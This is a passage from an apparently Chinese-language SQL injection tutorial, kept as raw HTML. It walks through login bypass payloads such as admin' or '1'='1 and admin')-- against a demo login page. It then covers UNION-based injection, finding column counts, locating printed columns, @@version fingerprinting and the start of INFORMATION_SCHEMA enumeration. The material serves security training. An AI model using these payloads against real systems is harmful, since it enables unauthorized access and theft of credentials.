(‘1’&#x3D;’1)，因此剩下的单引号原始查询中的引用将取而代之。</p>\n<p>因此，如果我们注入以下条件并<code>OR</code>在它和原始条件之间有一个运算符，它应该总是返回<code>true</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin<span class=\"string\">&#x27; or &#x27;</span><span class=\"number\">1</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>最终查询应如下所示：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span> <span class=\"keyword\">or</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">AND</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;something&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>这意味着以下内容：</p>\n<ul>\n<li>如果用户名是<code>admin</code><br><code>OR</code></li>\n<li>如果<code>1=1</code>返回<code>true</code>‘总是返回<code>true</code>‘<br><code>AND</code></li>\n<li>如果密码是<code>something</code></li>\n</ul>\n<p><img src=\"https://p.ipic.vip/z4rxm0.png\" alt=\"or_inject_diagram\"></p>\n<p>运算<code>AND</code>符将首先被评估，然后返回<code>false</code>。然后，<code>OR</code>运算符将被评估，如果其中一个语句是<code>true</code>，它将返回<code>true</code>。由于<code>1=1</code>总是返回<code>true</code>，此查询将返回<code>true</code>，并且它会授予我们访问权限。</p>\n<p>注意：我们上面使用的有效载荷是我们可以用来破坏身份验证逻辑的众多身份验证绕过有效载荷之一。[您可以在PayloadAllTheThings](<a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL</a> Injection#authentication-bypass)中找到完整的 SQLi 身份验证绕过负载列表，每个负载都适用于特定类型的 SQL 查询。</p>\n<hr>\n<h3 id=\"使用-OR-运算符绕过身份验证\"><a href=\"#使用-OR-运算符绕过身份验证\" class=\"headerlink\" title=\"使用 OR 运算符绕过身份验证\"></a>使用 OR 运算符绕过身份验证</h3><p>让我们尝试将此作为用户名并查看响应。 <img src=\"https://p.ipic.vip/axfg4d.png\" alt=\"注入成功\"></p>\n<p>我们能够以管理员身份成功登录。但是，如果我们不知道有效的用户名怎么办？这次让我们用不同的用户名尝试相同的请求。</p>\n<p><img src=\"https://p.ipic.vip/227o29.png\" alt=\"notadmin_fail\"></p>\n<p>登录失败，因为<code>notAdmin</code>表中不存在，导致整体查询错误。</p>\n<p><img src=\"https://p.ipic.vip/l1tx6e.png\" alt=\"notadmin_diagram\"></p>\n<p>要再次成功登录，我们需要一个整体<code>true</code>查询。这可以通过<code>OR</code>在密码字段中注入一个条件来实现，因此它总是会返回<code>true</code>。让我们尝试<code>something&#39; or &#39;1&#39;=&#39;1</code>作为密码。</p>\n<p><img src=\"https://p.ipic.vip/6me5id.png\" alt=\"密码或注入\"></p>\n<p>附加<code>OR</code>条件导致<code>true</code>整体查询，因为该<code>WHERE</code>子句返回表中的所有内容，并且第一行中的用户已登录。在这种情况下，由于两个条件都将返回，<code>true</code>我们不必提供测试用户名和密码，可以直接开始注入<code>&#39;</code>，直接用<code>&#39; or &#39;1&#39; = &#39;1</code>.</p>\n<p><img src=\"https://p.ipic.vip/a4r69u.png\" alt=\"basic_auth_bypass\"></p>\n<p>这是有效的，因为查询的计算结果与<code>true</code>用户名或密码无关。</p>\n<h2 id=\"0x06-使用注释\"><a href=\"#0x06-使用注释\" class=\"headerlink\" title=\"0x06 使用注释\"></a>0x06 使用注释</h2><p>本节将介绍如何使用注释来颠覆更高级的 SQL 查询的逻辑，并最终得到一个有效的 SQL 查询来绕过登录身份验证过程。</p>\n<hr>\n<h3 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h3><p>就像任何其他语言一样，SQL 也允许使用注释。注释用于记录查询或忽略查询的特定部分。除了内联注释外，我们还可以在 MySQL<code>-- </code>和中使用两种类型的行注释（尽管这通常不用于 SQL 注入）。可以按如下方式使用：<code>#``/**/``--</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT username FROM logins; -- Selects usernames from the logins table </span><br><span class=\"line\"></span><br><span class=\"line\">+---------------+</span><br><span class=\"line\">| username      |</span><br><span class=\"line\">+---------------+</span><br><span class=\"line\">| admin         |</span><br><span class=\"line\">| administrator |</span><br><span class=\"line\">| john          |</span><br><span class=\"line\">| tom           |</span><br><span class=\"line\">+---------------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>注意：在 SQL 中，仅使用两个破折号不足以开始注释。所以，它们后面必须有一个空格，所以注释以 (– ) 开头，末尾有一个空格。有时 URL 编码为 (–+)，因为 URL 中的空格被编码为 (+)。为清楚起见，我们将在末尾 (– -) 添加另一个 (-)，以显示空格字符的使用。</p>\n<p>符号<code>#</code>也可以使用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM logins WHERE username = &#x27;admin&#x27;; ## You can place anything here AND password = &#x27;something&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">+----+----------+----------+---------------------+</span><br><span class=\"line\">| id | username | password | date_of_joining     |</span><br><span class=\"line\">+----+----------+----------+---------------------+</span><br><span class=\"line\">|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |</span><br><span class=\"line\">+----+----------+----------+---------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>提示：如果您在浏览器的 URL 中输入有效负载，(#) 符号通常被视为标记，不会作为 URL 的一部分传递。为了在浏览器中使用 (#) 作为注释，我们可以使用 ‘%23’，这是一个 URL 编码 (#) 符号。</p>\n<p>服务器将在评估期间忽略查询的部分<code>AND password = &#39;something&#39;</code>。</p>\n<hr>\n<h3 id=\"带有注释的身份验证绕过\"><a href=\"#带有注释的身份验证绕过\" class=\"headerlink\" title=\"带有注释的身份验证绕过\"></a>带有注释的身份验证绕过</h3><p>让我们回到我们之前的例子并注入<code>admin&#39;-- </code>我们的用户名。最终查询将是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span><span class=\"comment\">-- &#x27; AND password = &#x27;something&#x27;;</span></span><br></pre></td></tr></table></figure>\n\n<p>正如我们从语法突出显示中看到的那样，用户名现在是<code>admin</code>，查询的其余部分现在作为注释被忽略。此外，通过这种方式，我们可以确保查询没有任何语法问题。</p>\n<p><code>admin&#39;-- </code>让我们尝试在登录页面上使用这些，并使用用户名和任何密码登录：</p>\n<p><img src=\"https://p.ipic.vip/sqgtxx.png\" alt=\"admin_dash\"></p>\n<p>如我们所见，我们能够绕过身份验证，因为新修改的查询会检查用户名，没有其他条件。</p>\n<hr>\n<h3 id=\"另一个例子\"><a href=\"#另一个例子\" class=\"headerlink\" title=\"另一个例子\"></a>另一个例子</h3><p>如果应用程序需要先检查特定条件，SQL 支持使用括号。括号内的表达式优先于其他运算符并首先计算。让我们来看这样一个场景：</p>\n<p><img src=\"https://p.ipic.vip/7qr0qc.png\" alt=\"paranthesis_fail\"></p>\n<p>上面的查询确保用户的 id 总是大于 1，这将阻止任何人以管理员身份登录。此外，我们还看到密码在用于查询之前已经过哈希处理。这将阻止我们通过密码字段进行注入，因为输入已更改为哈希。</p>\n<p>让我们尝试使用有效凭据登录<code>admin / p@ssw0rd</code>以查看响应。</p>\n<p><img src=\"https://p.ipic.vip/fa2q4c.png\" alt=\"paranthesis_valid_fail\"></p>\n<p>正如预期的那样，即使我们提供了有效的凭据，登录也会失败，因为管理员的 ID 等于 1。因此让我们尝试使用另一个用户的凭据登录，例如<code>tom</code>。</p>\n<p><img src=\"https://p.ipic.vip/r9086n.png\" alt=\"tom_login\"></p>\n<p>以 id 不等于 1 的用户身份登录成功。那么，我们如何以管理员身份登录呢？从前面关于注释的部分我们知道我们可以使用它们来注释查询的其余部分。因此，让我们尝试使用<code>admin&#39;-- </code>as 用户名。</p>\n<p><img src=\"https://p.ipic.vip/e5z9ah.png\" alt=\"paranthesis_error\"></p>\n<p>由于语法错误，登录失败，因为关闭的没有平衡开括号。要成功执行查询，我们必须添加一个右括号。让我们尝试使用用户名<code>admin&#39;)-- </code>关闭并注释掉其余部分。</p>\n<p><img src=\"https://p.ipic.vip/tf4imk.png\" alt=\"paranthesis_success\"></p>\n<p>查询成功，我们以管理员身份登录。我们输入的最终查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> logins <span class=\"keyword\">where</span> (username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x07-Union-Clause\"><a href=\"#0x07-Union-Clause\" class=\"headerlink\" title=\"0x07 Union Clause\"></a>0x07 Union Clause</h2><p>到目前为止，我们只是在操纵原始查询来颠覆 Web 应用程序逻辑并绕过身份验证，使用运算符<code>OR</code>和注释。然而，另一种类型的 SQL 注入是注入与原始查询一起执行的整个 SQL 查询。本节将通过使用 MySQL<code>Union</code>子句来演示这一点<code>SQL Union Injection</code>。</p>\n<hr>\n<h3 id=\"Union\"><a href=\"#Union\" class=\"headerlink\" title=\"Union\"></a>Union</h3><p>在开始学习 Union Injection 之前，我们应该先了解一下 SQL Union 子句。<a href=\"https://dev.mysql.com/doc/refman/8.0/en/union.html\">Union</a>子句用于组合多个<code>SELECT</code>语句的结果。这意味着通过<code>UNION</code>注入，我们将能够<code>SELECT</code>从多个表和数据库中跨 DBMS 转储和转储数据。让我们尝试<code>UNION</code>在示例数据库中使用运算符。首先，让我们看一下表的内容<code>ports</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM ports;</span><br><span class=\"line\"></span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| code     | city      |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| CN SHA   | Shanghai  |</span><br><span class=\"line\">| SG SIN   | Singapore |</span><br><span class=\"line\">| ZZ-21    | Shenzhen  |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>接下来，让我们看看表的输出<code>ships</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM ships;</span><br><span class=\"line\"></span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| Ship     | city      |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| Morrison | New York  |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">1 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>现在，让我们尝试使用<code>UNION</code>组合两个结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * FROM ports UNION SELECT * FROM ships;</span><br><span class=\"line\"></span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| code     | city      |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">| CN SHA   | Shanghai  |</span><br><span class=\"line\">| SG SIN   | Singapore |</span><br><span class=\"line\">| Morrison | New York  |</span><br><span class=\"line\">| ZZ-21    | Shenzhen  |</span><br><span class=\"line\">+----------+-----------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<p>如我们所见，<code>UNION</code>将两个语句的输出合并<code>SELECT</code>为一个，因此表中的条目<code>ports</code>和<code>ships</code>表中的条目合并为具有四行的单个输出。正如我们所看到的，一些行属于表，<code>ports</code>而另一些行属于<code>ships</code>表。</p>\n<p>注意：所有位置上所选列的数据类型应相同。</p>\n<hr>\n<h3 id=\"偶数列\"><a href=\"#偶数列\" class=\"headerlink\" title=\"偶数列\"></a>偶数列</h3><p>一条<code>UNION</code>语句只能对<code>SELECT</code>具有相同列数的语句进行操作。例如，如果我们尝试<code>UNION</code>两个具有不同列数的结果的查询，我们会收到以下错误：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT city FROM ports UNION SELECT * FROM ships;</span><br><span class=\"line\"></span><br><span class=\"line\">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>\n\n<p>上面的查询导致错误，因为第一个<code>SELECT</code>返回一列而第二个<code>SELECT</code>返回两列。一旦我们有两个返回相同列数的查询，我们就可以使用<code>UNION</code>运算符从其他表和数据库中提取数据。</p>\n<p>例如，如果查询是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> products <span class=\"keyword\">WHERE</span> product_id <span class=\"operator\">=</span> <span class=\"string\">&#x27;user_input&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们可以<code>UNION</code>在输入中注入一个查询，以便返回另一个表中的行：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> products <span class=\"keyword\">where</span> product_id <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">UNION</span> <span class=\"keyword\">SELECT</span> username, password <span class=\"keyword\">from</span> passwords<span class=\"comment\">-- &#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>假设表有两列，上述查询将返回<code>username</code>表<code>password</code>中的条目。<code>passwords``products</code></p>\n<hr>\n<h3 id=\"非偶数列\"><a href=\"#非偶数列\" class=\"headerlink\" title=\"非偶数列\"></a>非偶数列</h3><p>我们会发现原始查询的列数通常与我们要执行的 SQL 查询的列数不同，因此我们必须解决这个问题。例如，假设我们只有一列。在这种情况下，我们希望<code>SELECT</code>，我们可以为剩余的必需列放置垃圾数据，以便我们正在处理的列总数<code>UNION</code>与原始查询相同。</p>\n<p>例如，我们可以使用任何字符串作为垃圾数据，查询将返回该字符串作为该列的输出。如果我们<code>UNION</code>使用字符串<code>&quot;junk&quot;</code>，<code>SELECT</code>则查询<code>SELECT &quot;junk&quot; from passwords</code>将始终返回<code>junk</code>。我们也可以使用数字。例如，查询<code>SELECT 1 from passwords</code>将始终<code>1</code>作为输出返回。</p>\n<p>注意：在用垃圾数据填充其他列时，必须保证数据类型与该列的数据类型匹配，否则查询会返回错误。为了简单起见，我们将使用数字作为我们的垃圾数据，这对于跟踪我们的有效载荷位置也很方便，我们将在后面讨论。</p>\n<p>提示：对于高级 SQL 注入，我们可能只想使用 ‘NULL’ 来填充其他列，因为 ‘NULL’ 适合所有数据类型。</p>\n<p><code>products</code>上面例子中的表有两列，所以我们必须有<code>UNION</code>两列。如果我们只想得到一列“eg <code>username</code>”，我们必须这样做<code>username, 2</code>，这样我们就有相同数量的列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> products <span class=\"keyword\">where</span> product_id <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">UNION</span> <span class=\"keyword\">SELECT</span> username, <span class=\"number\">2</span> <span class=\"keyword\">from</span> passwords</span><br></pre></td></tr></table></figure>\n\n<p>如果我们在原始查询的表中有更多的列，我们必须添加更多的数字来创建剩余的所需列。例如，如果原始查询用于<code>SELECT</code>具有四列的表，我们的<code>UNION</code>注入将是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UNION</span> <span class=\"keyword\">SELECT</span> username, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span> <span class=\"keyword\">from</span> passwords<span class=\"comment\">-- &#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>此查询将返回：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- &#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">+-----------+-----------+-----------+-----------+</span><br><span class=\"line\">| product_1 | product_2 | product_3 | product_4 |</span><br><span class=\"line\">+-----------+-----------+-----------+-----------+</span><br><span class=\"line\">|   admin   |    2      |    3      |    4      |</span><br><span class=\"line\">+-----------+-----------+-----------+-----------+</span><br></pre></td></tr></table></figure>\n\n<p>正如我们所见，我们想要的 ‘ <code>UNION SELECT username from passwords</code>‘ 查询输出位于第二行的第一列，而数字填充了其余列。</p>\n<h2 id=\"0x08-Union-Injection\"><a href=\"#0x08-Union-Injection\" class=\"headerlink\" title=\"0x08 Union Injection\"></a>0x08 Union Injection</h2><p>现在我们知道 Union 子句是如何工作的以及如何使用它让我们学习如何在我们的 SQL 注入中使用它。让我们来看下面的例子：</p>\n<p><img src=\"https://p.ipic.vip/5yfxhm.png\" alt=\"img\"></p>\n<p>我们在搜索参数中看到了潜在的 SQL 注入。我们通过注入单引号 ( ) 来应用 SQLi Discovery 步骤<code>&#39;</code>，但我们确实收到错误：</p>\n<p><img src=\"https://p.ipic.vip/pabe77.png\" alt=\"img\"></p>\n<p>由于我们造成了错误，这可能意味着该页面容易受到 SQL 注入攻击。这种情况非常适合通过基于联合的注入进行利用，因为我们可以看到我们的查询结果。</p>\n<hr>\n<h3 id=\"检测列数\"><a href=\"#检测列数\" class=\"headerlink\" title=\"检测列数\"></a>检测列数</h3><p>在继续使用基于联合的查询之前，我们需要找到服务器选择的列数。有两种检测列数的方法：</p>\n<ul>\n<li>使用<code>ORDER BY</code></li>\n<li>使用<code>UNION</code></li>\n</ul>\n<h5 id=\"使用-ORDER-BY\"><a href=\"#使用-ORDER-BY\" class=\"headerlink\" title=\"使用 ORDER BY\"></a>使用 ORDER BY</h5><p>检测列数的第一种方法是通过<code>ORDER BY</code>我们之前讨论过的函数。我们必须注入一个查询，该查询按我们指定的列对结果进行排序，“即第 1 列、第 2 列等等”，直到我们收到一个错误，指出指定的列不存在。</p>\n<p>例如，我们可以从 开始<code>order by 1</code>，按第一列排序，然后成功，因为表必须至少有一个列。然后我们会做<code>order by 2</code>，然后<code>order by 3</code>直到我们到达一个返回错误的数字，或者页面没有显示任何输出，这意味着这个列号不存在。我们成功排序的最终成功列为我们提供了列总数。</p>\n<p>如果我们在 处失败<code>order by 4</code>，这意味着该表有三列，这是我们能够成功排序的列数。让我们回到之前的示例并尝试使用以下有效负载进行相同的操作：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; order by 1-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>提醒：我们在末尾添加了一个额外的破折号 (-)，以向您表明 (–) 之后有一个空格。</p>\n<p>如我们所见，我们得到了一个正常的结果：</p>\n<p><img src=\"https://p.ipic.vip/5yfxhm.png\" alt=\"img\"></p>\n<p>接下来，让我们尝试使用以下有效负载按第二列排序：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; order by 2-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>我们仍然得到结果。我们注意到它们的排序方式与预期的不同：</p>\n<p><img src=\"https://p.ipic.vip/eo1va8.jpg\" alt=\"img\"></p>\n<p><code>3</code>我们对 column和做同样的事情<code>4</code>并得到结果。但是，当我们尝试<code>ORDER BY</code>第 5 列时，出现以下错误：</p>\n<p><img src=\"https://p.ipic.vip/d109h9.jpg\" alt=\"img\"></p>\n<p>这意味着该表恰好有 4 列。</p>\n<h5 id=\"使用-UNION\"><a href=\"#使用-UNION\" class=\"headerlink\" title=\"使用 UNION\"></a>使用 UNION</h5><p>另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功取回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。我们可以从注入一个 3 列<code>UNION</code>查询开始：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,2,3-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>我们收到一条错误消息，指出列数不匹配：  </p>\n<p><img src=\"https://p.ipic.vip/65slq5.png\" alt=\"img\"></p>\n<p>因此，让我们尝试四列并查看响应：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,2,3,4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/sz9ia5.png\" alt=\"img\"></p>\n<p>这次我们成功得到了结果，这意味着该表再次具有 4 列。我们可以使用任何一种方法来确定列数。一旦我们知道了列数，我们就知道如何形成我们的有效载荷，我们可以继续下一步。</p>\n<hr>\n<h3 id=\"注射位置\"><a href=\"#注射位置\" class=\"headerlink\" title=\"注射位置\"></a>注射位置</h3><p>虽然查询可能返回多列，但 Web 应用程序可能只显示其中的一部分。因此，如果我们将查询注入到页面上未打印的列中，我们将无法获得其输出。这就是为什么我们需要确定将哪些列打印到页面，以确定在何处放置我们的注入。在前面的示例中，虽然注入的查询返回 1、2、3 和 4，但我们在页面上只看到 2、3 和 4 作为输出数据返回给我们：</p>\n<p><img src=\"https://p.ipic.vip/sz9ia5.png\" alt=\"img\"></p>\n<p>并非每一列都会显示给用户是很常见的。例如，ID 字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们打印了第 2 列、第 3 列和第 4 列以将我们的注入放置在其中任何一个中。<code>We cannot place our injection at the beginning, or its output will not be printed.</code></p>\n<p>这是使用数字作为我们的垃圾数据的好处，因为它可以很容易地跟踪打印了哪些列，因此我们知道在哪一列放置我们的查询。为了测试我们是否可以从数据库中获取“而不仅仅是数字”的实际数据，我们可以使用<code>@@version</code>SQL 查询作为测试并将其放在第二列而不是数字 2 中：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,@@version,3,4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/egjoic.jpg\" alt=\"img\"></p>\n<p>如我们所见，我们可以获得显示的数据库版本。现在我们知道如何形成我们的 Union SQL 注入有效负载，以成功地获得打印在页面上的查询输出。在下一节中，我们将讨论如何枚举数据库并从其他表和数据库中获取数据。</p>\n<h2 id=\"0x09-数据库枚举\"><a href=\"#0x09-数据库枚举\" class=\"headerlink\" title=\"0x09 数据库枚举\"></a>0x09 数据库枚举</h2><p>在前面的部分中，我们了解了不同的 SQL 查询<code>MySQL</code>和 SQL 注入以及如何使用它们。本节将使用所有这些，并在 SQL 注入中使用 SQL 查询从数据库中收集数据。</p>\n<hr>\n<h3 id=\"MySQL指纹识别\"><a href=\"#MySQL指纹识别\" class=\"headerlink\" title=\"MySQL指纹识别\"></a>MySQL指纹识别</h3><p>在枚举数据库之前，我们通常需要确定我们正在处理的 DBMS 类型。这是因为每个 DBMS 都有不同的查询，知道它是什么将帮助我们知道使用什么查询。</p>\n<p>作为初步猜测，如果我们在 HTTP 响应中看到的 Web 服务器是<code>Apache</code>或<code>Nginx</code>，则可以很好地猜测该 Web 服务器正在 Linux 上运行，因此 DBMS 很可能是<code>MySQL</code>。如果网络服务器是，这同样也适用于 Microsoft DBMS <code>IIS</code>，所以它很可能是<code>MSSQL</code>。然而，这是一个牵强附会的猜测，因为许多其他数据库可以在操作系统或 Web 服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。</p>\n<p>正如我们<code>MySQL</code>在本模块中介绍的那样，让我们使用指纹<code>MySQL</code>数据库。以下查询及其输出将告诉我们我们正在处理<code>MySQL</code>：</p>\n<table>\n<thead>\n<tr>\n<th>有效载荷</th>\n<th>何时使用</th>\n<th>预期产出</th>\n<th>输出错误</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>SELECT @@version</code></td>\n<td>当我们有完整的查询输出时</td>\n<td>MySQL版本’即<code>10.3.22-MariaDB-1ubuntu1</code>‘</td>\n<td>在 MSSQL 中，它返回 MSSQL 版本。其他 DBMS 出错。</td>\n</tr>\n<tr>\n<td><code>SELECT POW(1,1)</code></td>\n<td>当我们只有数字输出时</td>\n<td><code>1</code></td>\n<td>其他 DBMS 出错</td>\n</tr>\n<tr>\n<td><code>SELECT SLEEP(5)</code></td>\n<td>盲&#x2F;无输出</td>\n<td>延迟页面响应 5 秒并返回<code>0</code>。</td>\n<td>不会延迟与其他 DBMS 的响应</td>\n</tr>\n</tbody></table>\n<p>正如我们在上一节的示例中看到的，当我们尝试时<code>@@version</code>，它给了我们：</p>\n<p><img src=\"https://p.ipic.vip/vejupm.jpg\" alt=\"img\"></p>\n<p>输出<code>10.3.22-MariaDB-1ubuntu1</code>意味着我们正在处理<code>MariaDB</code>类似于 MySQL 的 DBMS。由于我们有直接的查询输出，因此我们不必测试其他有效载荷。相反，我们可以测试它们，看看我们得到了什么。</p>\n<hr>\n<h3 id=\"INFORMATION-SCHEMA-数据库\"><a href=\"#INFORMATION-SCHEMA-数据库\" class=\"headerlink\" title=\"INFORMATION_SCHEMA 数据库\"></a>INFORMATION_SCHEMA 数据库</h3><p>要使用从表中提取数据<code>UNION SELECT</code>，我们需要正确地形成我们的<code>SELECT</code>查询。为此，我们需要以下信息：</p>\n<ul>\n<li>数据库列表</li>\n<li>每个数据库中的表列表</li>\n<li>每个表中的列列表</li>\n</ul>\n<p>有了以上信息，我们就可以形成我们的<code>SELECT</code>语句，从 DBMS 内的任何数据库中的任何表中的任何列中转储数据。这是我们可以使用<code>INFORMATION_SCHEMA</code>数据库的地方。</p>\n<p>INFORMATION_SCHEMA数据库包含有关服务器上存在<a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html\">的</a>数据库和表的元数据。该数据库在利用 SQL 注入漏洞时起着至关重要的作用。由于这是一个不同的数据库，我们不能直接用语句调用它的表<code>SELECT</code>。如果我们只为语句指定一个表的名称<code>SELECT</code>，它将在同一数据库中查找表。</p>\n<p>因此，要引用另一个数据库中存在的表，我们可以使用点 ‘ <code>.</code>‘ 运算符。例如，对于名为 的数据库中存在的<code>SELECT</code>表，我们可以使用：<code>users``my_database</code></p>\n<figure class=\"highlight 